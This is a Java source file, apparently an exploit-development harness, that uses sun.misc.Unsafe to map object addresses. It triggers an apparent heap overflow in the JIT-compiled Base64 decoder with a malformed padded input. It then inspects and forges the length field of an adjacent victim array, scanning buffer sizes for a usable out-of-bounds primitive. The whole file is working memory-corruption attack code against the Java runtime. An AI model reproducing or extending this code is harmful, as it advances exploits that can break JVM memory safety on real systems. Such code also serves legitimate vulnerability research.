import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * Why does dst[65] | vic[64] fail to line up?
 *
 * Prints real object addresses so we can see the allocation order, the gap
 * between neighbours, and exactly which spill bytes land on the victim header.
 */
public final class Adjacency {
    private static volatile int sink;
    private static sun.misc.Unsafe u;
    private static long abase;

    static long addr(Object o) {
        Object[] arr = new Object[] { o };
        long base = u.arrayBaseOffset(Object[].class);
        return u.getLong(arr, base);
    }

    static void describe(String label, Object o) {
        long a = addr(o);
        System.out.printf("  %-10s addr=0x%012x align8=%d%n", label, a, a % 8);
    }

    public static void main(String[] args) throws Exception {
        Field uf = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        u = (sun.misc.Unsafe) uf.get(null);
        abase = u.arrayBaseOffset(byte[].class);

        Base64.Decoder d = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] bad = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);
        byte[] warm = new byte[4096];
        for (int i = 0; i < 200_000; i++) sink += d.decode(valid, warm);

        // --- allocation order under the JIT ---
        System.out.println("[A] interleaved sequential allocation:");
        byte[][] dstA = new byte[4][], vicA = new byte[4][];
        for (int i = 0; i < 4; i++) {
            dstA[i] = new byte[65];
            vicA[i] = new byte[64];
            describe("dst" + i, dstA[i]);
            describe("vic" + i, vicA[i]);
        }
        for (int i = 0; i < 3; i++) {
            long gap = addr(vicA[i]) - addr(dstA[i]);
            long next = addr(dstA[i + 1]) - addr(vicA[i]);
            System.out.printf("  vic%d - dst%d = %d   dst%d - vic%d = %d%n",
                    i, i, gap, i + 1, i, next);
        }

        // --- does the spill land on the immediately following array? ---
        System.out.println("[B] trigger on dstA[0] (size 65), victim vicA[0]:");
        long d0 = addr(dstA[0]), v0 = addr(vicA[0]);
        System.out.printf("  byte distance between data starts = %d%n", v0 - d0);
        System.out.println("  dst0 object spans [0, 88) from its header; data at +16..+80");
        System.out.println("  spill writes data[48..111] => object offsets 64..127");
        Arrays.fill(vicA[0], (byte) 0x5a);
        int before = vicA[0].length;
        try { d.decode(bad, dstA[0]); } catch (IllegalArgumentException e) { }
        System.out.printf("  vic0.length: %d -> %d (0x%08x)%n", before, vicA[0].length, vicA[0].length);

        // --- raw header bytes of the victim ---
        System.out.println("[C] victim header as written by the spill:");
        for (long off = 0; off < 32; off += 8) {
            System.out.printf("  vic+%-2d = 0x%016x%n", off, u.getLong(vicA[0], off));
        }
        System.out.printf("  mark=0x%016x klass=0x%08x len=0x%08x%n",
                u.getLong(vicA[0], 0), u.getInt(vicA[0], 8), u.getInt(vicA[0], 12));

        // --- try the whole matrix: which dst size puts a positive length on a victim? ---
        System.out.println("[D] scanning dst sizes for a positive landing:");
        for (int dl = 56; dl <= 136; dl += 8) {
            byte[][] dd = new byte[8][], vv = new byte[8][];
            for (int i = 0; i < 8; i++) { dd[i] = new byte[dl]; vv[i] = new byte[64]; }
            try { d.decode(bad, dd[0]); } catch (IllegalArgumentException e) { }
            System.out.printf("  dst[%3d] victimLen=0x%08x (%d)%n",
                    dl, vv[0].length, vv[0].length);
        }
    }
}
